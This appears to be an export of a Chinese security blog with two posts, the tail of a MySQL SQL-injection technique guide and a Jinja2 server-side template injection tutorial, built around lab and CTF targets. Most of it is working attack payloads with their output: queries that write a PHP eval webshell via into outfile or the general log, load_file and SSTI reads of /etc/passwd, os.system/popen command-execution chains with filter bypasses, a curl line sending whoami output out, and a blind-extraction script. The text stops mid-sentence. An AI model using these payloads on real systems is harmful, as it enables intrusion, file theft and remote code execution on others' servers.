<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(locate(&#39;ro&#39;, substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(position(&#39;ro&#39; IN substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(instr(substring(user(),1,2),&#39;ro&#39;)&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>堆叠注入</strong></li>
</ul>
<p>例子：强网杯2019随便注</p>
<p>payload如下形式</p>
<p>查询字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;use information_schema;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name&#x3D;&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>查询内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>load_file&amp;into outfile</strong></li>
</ul>
<p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p>
<p><strong>into outfile</strong></p>
<p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p>
<p>2.拥有file权限</p>
<p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</code>查看信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqld --secure_file_priv&#x3D;null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv&#x3D;&#x2F;tmp&#x2F;(导入导出只允许在&#x2F;tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv&#x3D;(任意导入导出)</span><br></pre></td></tr></table></figure>

<p><code>into outfile</code>有四种写入文件的方式</p>
<p><strong>通过union注入写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;2.php&#39;;</span><br><span class="line">Query OK, 2 rows affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/Ze50qf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png" alt="Ze50qf.md.png"></a></p>
<p><strong>通过FIELDS TERMINATED BY写入文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p>
<p><a href="https://imgchr.com/i/ZeT9xA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png" alt="ZeT9xA.md.png"></a></p>
<p>可以看到在一个字段的情况下无法添加我们的webshell。</p>
<p><strong>通过LINES TERMINATED BY写入文件</strong></p>
<p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;3.php&#39; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/ZeTbWQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png" alt="ZeTbWQ.md.png"></a></p>
<p><strong>LINES STARTING BY写入shell</strong></p>
<p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 into outfile &#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>load_file</strong></p>
<p>1.要求拥有file权限</p>
<p>2.知道文件所在绝对路径</p>
<p>3.同样受<code>secure_file_priv</code>限制</p>
<p><strong>union注入进行load_file</strong></p>
<p>效果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| flag                 |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1                    |</span><br><span class="line">| &lt;?php phpinfo();?&gt;1</span><br><span class="line"> |</span><br><span class="line">+----------------------+</span><br><span class="line">2 rows in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>

<p><strong>利用报错注入进行load_file</strong></p>
<p>测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and updatexml(1,concat(0x7e,(select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&lt;?php phpinfo();?&gt;1</span><br><span class="line">~&#39;</span><br></pre></td></tr></table></figure>

<p>成功得到文件内容</p>
<p><strong>利用时间盲注进行load_file</strong></p>
<p>测试如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 and if(mid((select load_file(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),1,1)&#x3D;&#39;&lt;&#39;,sleep(3),1);</span><br><span class="line">Empty set, 1 warning (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>成功延时3s，可配合脚本得到文件内容。</p>
<p><strong>利用load_file扫描文件是否存在</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;4.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~0~&#39;</span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;&#39; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;1.php&#39;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~1~&#39;</span><br></pre></td></tr></table></figure>

<p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p>
<p><strong>另类写读文件</strong></p>
<p><strong>dumpfile</strong> 官方文档如下：</p>
<p><a href="https://imgchr.com/i/Zmk139" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmk139.md.png" alt="Zmk139.md.png"></a></p>
<p><strong>危险变量导致getshell</strong></p>
<p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;; 查看配置信息</span><br><span class="line"></span><br><span class="line">set global general_log&#x3D;on 开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;F:\\phpstudy\\www\\shell.php&#39;;</span><br><span class="line"></span><br><span class="line">select &#39;&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>

<p>最终<code>shell.php</code>为我们的<code>webshell</code></p>
<p><a href="https://imgchr.com/i/ZmGHSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png" alt="ZmGHSI.md.png"></a></p>
<h3 id="组合拳思考"><a href="#组合拳思考" class="headerlink" title="组合拳思考"></a>组合拳思考</h3><p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p>
<p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p>
<p>以<code>Sqli-lab less-1</code>为例</p>
<p>首先通过<code>polygon</code>函数进行报错</p>
<p><a href="https://imgchr.com/i/Zmuiy4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png" alt="Zmuiy4.md.png"></a></p>
<p>接着通过列重复来报错</p>
<p><a href="https://imgchr.com/i/ZmK8vF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png" alt="ZmK8vF.md.png"></a></p>
<p><a href="https://imgchr.com/i/ZmKyKe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png" alt="ZmKyKe.md.png"></a></p>
<p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p>
<p><a href="https://imgchr.com/i/ZmMzFI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png" alt="ZmMzFI.md.png"></a></p>
<p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p>
<p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
<p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>
]]></content>
      <tags>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI模板注入-Jinja2</title>
    <url>/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又划水了一天，最后划累了学习了一会，写了这篇文章，又遇到的<code>hexo</code>遇见花括号解析错误的问题，一点点把文章断点才解决(<code>hexo</code>断点调试</p>
<h3 id="SSTI介绍"><a href="#SSTI介绍" class="headerlink" title="SSTI介绍"></a><code>SSTI</code>介绍</h3><p><code>SSTI</code>，服务端模板注入攻击，发生在<code>MVA</code>框架的<code>view</code>层中。</p>
<p>注入原因：</p>
<blockquote>
<p>服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
</blockquote>
<p>测试<code>SSTI</code>的流程方式如下图：</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt="Z0NUje.png"></p>
<h4 id="SSTI-for-Flask"><a href="#SSTI-for-Flask" class="headerlink" title="SSTI for Flask"></a><strong>SSTI for Flask</strong></h4><p><code>Flask</code>的模板引擎为<code>Jinja2</code>,而主要出现问题的函数为<code>render_template_string()</code>，并没有渲染模板文件，直接把字符串渲染到了<code>html</code>,如果不经过过滤则很容易造成恶意代码注入问题。</p>
<h3 id="实战过程"><a href="#实战过程" class="headerlink" title="实战过程"></a>实战过程</h3><h4 id="代码搭建"><a href="#代码搭建" class="headerlink" title="代码搭建"></a>代码搭建</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">	template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;'</span>.format(name)</span><br><span class="line">	<span class="keyword">return</span> render_template_string(template)</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<h4 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cb2d.png" alt="Z0cb2d.png"></p>
<p>通过<code>payload:1+1</code>的返回为<code>2</code>可以得知存在注入。</p>
<h4 id="导出config变量和session"><a href="#导出config变量和session" class="headerlink" title="导出config变量和session"></a>导出config变量和session</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cc8J.png" alt="Z0cc8J.png"></p>
<p>可以通过<code>config</code>和<code>session</code>进行导出</p>
<h4 id="读-写文件"><a href="#读-写文件" class="headerlink" title="读/写文件"></a>读/写文件</h4><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>通过<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<p>以上两种<code>payload</code>都可以进行文件读取</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0gmIU.png" alt="Z0gmIU.png"></p>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>同样也是两种<code>payload</code>，这里只列举一种了（其实可以通过<code>Fuzz</code>获得多种</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evilconfig.cfg'</span>, <span class="string">'w'</span>).write(<span class="string">'test'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/06/Z0gBQA.png" alt="Z0gBQA.png"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>

<p><strong>python3的命令执行</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>既然可以命令执行，同样可以反弹<code>shell</code>，可以通过<code>bash</code>进行反弹<code>shell</code></p>
<h4 id="通过自定义模块执行命令"><a href="#通过自定义模块执行命令" class="headerlink" title="通过自定义模块执行命令"></a>通过自定义模块执行命令</h4><p>通过<code>SSTI</code>将以下内容写入<code>/tmp/test</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system\nCMD = system'</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output\nRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>config.from_pyfile</code>对<code>/tmp/test</code>进行编译执行文件中的内容</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZB9Rtf.png" alt="ZB9Rtf.png"></p>
<p>可以通过<code>config</code>中的变量进行命令执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'RUNCMD'</span>](<span class="string">'/usr/bin/id'</span>,shell=<span class="literal">True</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过命令执行过滤"><a href="#绕过命令执行过滤" class="headerlink" title="绕过命令执行过滤"></a>绕过命令执行过滤</h3><h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号[]"></a>过滤中括号[]</h4><p>可以用<code>getitem</code>和<code>pop</code>进行绕过过滤</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.linecache.os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="chr函数绕过过滤"><a href="#chr函数绕过过滤" class="headerlink" title="chr函数绕过过滤"></a><strong>chr函数绕过过滤</strong></h5><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="借助request对象"><a href="#借助request对象" class="headerlink" title="借助request对象"></a><strong>借助request对象</strong></h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>

<h5 id="过滤引号下的命令执行"><a href="#过滤引号下的命令执行" class="headerlink" title="过滤引号下的命令执行"></a><strong>过滤引号下的命令执行</strong></h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(chr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request</code>或者<code>__getattr__</code>进行绕过</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[59][request.args.init][request.args.globals]['linecache'].os.popen('whoami').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals_</span><br></pre></td></tr></table></figure>

<h4 id="过滤双括号"><a href="#过滤双括号" class="headerlink" title="过滤双括号"></a>过滤双括号</h4><h5 id="利用如下标记，进行盲命令执行"><a href="#利用如下标记，进行盲命令执行" class="headerlink" title="利用如下标记，进行盲命令执行"></a>利用如下标记，进行盲命令执行</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBZdhR.png" alt="ZBZdhR.png"></p>
<h5 id="盲注文件"><a href="#盲注文件" class="headerlink" title="盲注文件"></a>盲注文件</h5><p>利用<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/lihuaiqiu'</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">'f'</span> %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>进行盲注，这里原作者<code>p0</code>的博客中只有<code>post脚本</code>，按照<code>sql</code>盲注的思路我自己也写了一个<code>GET</code>的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1:5000?name="</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload=<span class="string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/lihuaiqiu').read()["</span>+str(i)+<span class="string">":"</span>+str(i+<span class="number">1</span>)+<span class="string">"]=='"</span>+chr(j)+<span class="string">"' %&#125;~ok~&#123;% endif %&#125;"</span></span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ok'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZBcezj.png" alt="ZBcezj.png"></p>
<h3 id="最后关于python沙箱逃逸以及Jinja2的一些思考"><a href="#最后关于python沙箱逃逸以及Jinja2的一些思考" class="headerlink" title="最后关于python沙箱逃逸以及Jinja2的一些思考"></a>最后关于python沙箱逃逸以及Jinja2的一些思考</h3><p>其实<code>SSTI</code>或者说<code>Python</code>沙箱逃逸，最重要的的几点还是找<code>object</code>，获取<code>subclasses</code>，然后对<code>subclasses</code>，进行<code>fuzz</code>，例如找到<code>linecache,catch_warnings</code>这种可以进行危险操作的东西，例如如下脚本的<code>fuzz</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  |% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %|</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  |% endif %|</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;    //这里面的两个竖杠其实也是花括号，这里我是为了避免hexo解析错误的问题</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBf9V1.png" alt="ZBf9V1.png"></p>
<p>逻辑就是在<code>subclasses</code>的子类中找到危险子类，可以通过寻找<code>catch_warnings</code>,因为在这个特殊的类中是有<code>__builtins__</code>这种危险属性的。第二个要说明的点是</p>
